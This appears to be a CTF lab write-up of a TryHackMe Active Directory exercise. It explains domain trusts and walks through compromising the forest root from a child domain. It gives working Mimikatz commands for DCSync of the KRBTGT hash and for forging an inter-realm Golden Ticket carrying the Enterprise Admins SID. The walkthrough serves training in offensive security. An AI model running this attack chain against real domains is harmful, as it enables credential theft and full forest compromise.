# Exploiting Domain Trusts

We have only exploited the ZA.TRYHACKME.LOC domain. Surely TRYHACKME must have domains for other regions as well? Well, if we take control of the root domain, TRYHACKME.LOC, we will be in a position to compromise all of these regional domains.

***

<figure><img src="../../../.gitbook/assets/image (195).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:green;">Domain Trusts</mark>

As discussed before, a forest is a collection of one or more domain trees inside an AD network. Domain Trusts are a mechanism for users in the network to gain access to other resources in the domain. For the most part, trusts outline how the domains inside of a forest communicate with each other. In some environments, trusts can be extended out to external domains and even forests in some cases.

<figure><img src="../../../.gitbook/assets/image (189).png" alt=""><figcaption></figcaption></figure>

There are two main types of trusts that can be configured between domains:

{% tabs %}
{% tab title="1. Directional" %}
The direction of the trust flows from a trusting domain to a trusted domain
{% endtab %}

{% tab title="2. Transitive" %}
The trust relationship expands beyond just two domains to include other trusted domains
{% endtab %}
{% endtabs %}

<figure><img src="../../../.gitbook/assets/image (190).png" alt=""><figcaption></figcaption></figure>

It is common to have a root or parent domain in a forest. In our case, this is TRYHACKME.LOC. For each regional office, sub or child domains are created, such as ZA.TRYHACKME.LOC or UK.TRYHACKME.LOC. This forest configuration will allow the sharing of resources between the ZA and the UK office.&#x20;

However, as an attacker, we can also exploit this trust to compromise the parent domain if we have compromised a child domain.

### <mark style="color:green;">KRBTGT and Golden Tickets</mark>

I have explained this before in a previous section:

{% embed url="https://mfkrypt.gitbook.io/stuff/ctf-writeups/tryhackme/lateral-movement-and-pivoting/use-of-alternate-authentication-material#golden-ticket-vs-silver-ticket" %}

In order to forge TGTs, we need the following information:

* The FQDN of the domain
* The Security Identifier (SID) of the domain
* The username of the account we want to impersonate
* The KRBTGT password hash

We will again use Mimikatz with a DCSync to recover the KRBTGT password hash on THMSERVER2

### <mark style="color:green;">DCSync</mark>

DCSync is an attack that allows an adversary to simulate the behavior of a domain controller (DC) and retrieve password data via domain replication. The classic use for DCSync is as a precursor to a Golden Ticket attack, as it can be used to retrieve the KRBTGT hash.

<figure><img src="../../../.gitbook/assets/image (192).png" alt=""><figcaption></figcaption></figure>

It uses commands in the Directory Replication Service Remote Protocol (MS-DRSR) to simulate the behavior of a domain controller and ask other domain controllers to replicate information

```powershell
mimikatz.exe
# privilege::debug
# lsadump::dcsync /user:za\krbtgt
```

<figure><img src="../../../.gitbook/assets/image (191).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:green;">Inter-Realm TGTs</mark>

We can take this a step further by forging an Inter-Realm TGT. Inter-Realm TGTs are used to **provide access to resources in other domains**. In our case, we want to exploit the bidirectional trust relationship between the child and parent domain **to gain full access to the parent domain**.

The key here is that we will exploit the trust the parent domain has with our child domain by adding the SID of the **Enterprise Admins (EA)** group as an extra SID to our forged ticket for the domain controller of the child domain. The EA group belongs to the parent domain and membership to this group essentially grants Administrative privileges over the entire forest! The default SID for this group is **S-1-5-21-\<RootDomain>-519**.

Before we can go into exploitation, we first need to recover two SIDs:

* The SID of the child domain controller (THMDC), which we will impersonate in our forged TGT
* The SID of the EA in the parent domain, which we will add as an extra SID to our forged TGT

Recover the SID of the child domain controller using:

```powershell
Get-ADComputer -Identity "THMDC"
```

<figure><img src="../../../.gitbook/assets/image (193).png" alt=""><figcaption></figcaption></figure>

We can recover the SID of the EA group using the following command to query the parent domain controller:

```powershell
Get-ADGroup -Identity "Enterprise Admins" -Server thmrootdc.tryhackme.loc
```

<figure><img src="../../../.gitbook/assets/image (194).png" alt=""><figcaption></figcaption></figure>

Then in Mimikatz, generate the Golden Ticket with the EA SID and pass the ticket

```powershell
kerberos::golden /user:Administrator /domain:za.tryhackme.loc /sid:<SID of child domain> /service:krbtgt /rc4:<Password hash of krbtgt user> /sids:<SID of Enterprise Admins group> /ptt
```

<figure><img src="../../../.gitbook/assets/image (196).png" alt=""><figcaption></figcaption></figure>

Verify that the ticket works to for the child DC

```powershell
dir \\thmdc.za.tryhackme.loc\c$
```

<figure><img src="../../../.gitbook/assets/image (197).png" alt=""><figcaption></figcaption></figure>

It works. Now let's try to enumerate the directory of the Parent DC

```powershell
dir \\thmrootdc.tryhackme.loc\c$
```

<figure><img src="../../../.gitbook/assets/image (198).png" alt=""><figcaption></figcaption></figure>

Get the flag in Administrator's Desktop

<figure><img src="../../../.gitbook/assets/image (199).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (200).png" alt=""><figcaption></figcaption></figure>
